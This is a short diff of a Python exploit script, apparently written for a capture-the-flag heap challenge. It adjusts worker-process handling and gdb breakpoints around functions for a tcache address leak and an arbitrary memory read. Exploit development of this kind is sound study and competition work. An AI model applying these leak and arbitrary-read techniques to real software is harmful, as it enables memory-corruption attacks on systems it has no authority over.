@@ -130,12 +130,11 @@ def make_workers(num: int, fn, *args):
 
 def wait_workers():
     for pid in pids:
-        os.wait()
-        pids.pop()
+        os.waitpid(pid, 0)
+        pids.remove(pid)
 
 
 def kill_workers():     # mhm, I mean retire*
-    print(pids)
     for pid in pids:
         os.kill(pid, 9) # trust me
 
@@ -162,7 +161,6 @@ def tcache_leak(thd1: thread_comm, thd2: thread_comm):
 
     for _ in range(TRIES):
         thd2.printf(b'0', do_recv=False)
-    wait_workers()
 
     results = set(thd2.clean().splitlines())
     print(results)
@@ -183,6 +181,7 @@ def get_tcache_leak():
         if tcache_addr:
             break
 
+    wait_workers()
     thd1.quit()
     thd2.quit()
     return tcache_addr
@@ -230,7 +229,7 @@ def arbitrary_read(target_addr: int, tcache_addr_loc: int):
 
     attach_gdb('''
         b malloc
-        b fprintf
+        b printf
         b free
         c
     ''')
